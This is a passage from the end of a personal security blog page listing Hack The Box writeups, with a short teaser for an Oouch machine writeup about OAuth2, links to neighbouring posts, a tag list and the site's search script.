Writeup</h3><div class="text-muted small"><p> HTB - Oouch Overview This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2. Persistence a...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/jewel/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Jewel Writeup</p></a> <a href="/posts/bucket/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Bucket Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
